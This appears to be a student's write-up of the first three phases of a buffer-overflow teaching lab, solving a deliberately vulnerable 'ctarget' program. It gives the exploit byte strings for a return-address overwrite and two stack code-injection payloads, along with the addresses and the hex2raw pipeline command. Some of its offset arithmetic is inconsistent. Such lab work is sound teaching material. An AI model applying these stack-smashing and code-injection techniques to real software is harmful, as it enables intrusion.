This lab has five phases. 
Before doing anything, first, of course, get the objdump of ctarget. 
phase 1. In pdf section 4.1, When the function getbuff() is called in test() in location 0x401971, the return address: 0x401976, is saved in the top of the stack, then in getbuff, it pre-allocated 0x28=40 bytes for the text that user will enter. It's easy to see, right after these 40 bytes is the return address. To redirect the getbuff() to touch1(), we simply have to imput 40 bytes of random characters (no 0x00, no \n), then the address of touch 1 in little endian format. 0x4017c0 ->c0 17 40. Using the hex2raw, the exploit.txt is converted to hex, then feed into ctarget with command cat exploit.txt | ./hex2raw | ./ctarget
Exploit string is :
31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 c0 17 40
The 31 does not matter, just as place holder. 


phase 2. 
Now calling touch2() is easy, but before that, we need to get copy a cookie address to $rdi, as the parameter to pass in. 
This ctarget is not compiled with protection of injecting code. Using gdb to run it once to getbuf. Then print the address of %rsp. 
Which is 0x5561dc78. At location 0x6044e4 is the cookie. 
To move a 4 byte value at address 0x6044e4 to %edi. We need 
mov 0xyyyyyy(%rip) %rdi, This will add %rip with 0xyyyyyy, and the length of current instruction, and dereference it and copy the value
This is just like the instruction at address 0x40136b
48 8b 3d 0e 31 20 00, 
because 0xyyyyyy+%rip= 0x6044e4, %rip =0x5561dc78+7, so 0xyyyyy=-0x5501979b, indecimal, this value is: -1426167707, which in hex is AAFE6865
So instruction is: 
mov -0x55019794(%rip) %rdi
48 8b 3d 65 68 FE AA
Then returnq (C3)
The overflowed part should be the 8 byte address of the start of the injected instructions (0x5561dc78) and also address of touch2() 0x4017ec
48 8b 3d 65 68 FE AA C3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 78 dc 61 55 00 00 00 00 ec 17 40 00

phase 3. 
As the advice suggested, this phase the parameter passed is an address of a string representation of cookie. 
From the previous few runs of the program we know the cookie is: 0x59b997fa, so string representation without the "0x"is
"59b997fa", translate from ascii table its: 35 39 62 39 39 37 66 61 00
we put these in the front of the exploit string, so the address of this string is 0x5561dc78
The instruction to move address to the %rdi is:
mov 0x5561dc78 %edi
opcode:
bf 78 dc 61 55, plus the return C3 the address of the start of this instruction is 0x5561dc78+9=0x5561dc81. which is the first overflowed address
35 39 62 39 39 37 66 61 00 bf 78 dc 61 55 C3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 81 dc 61 55 00 00 00 00 fa 18 40 00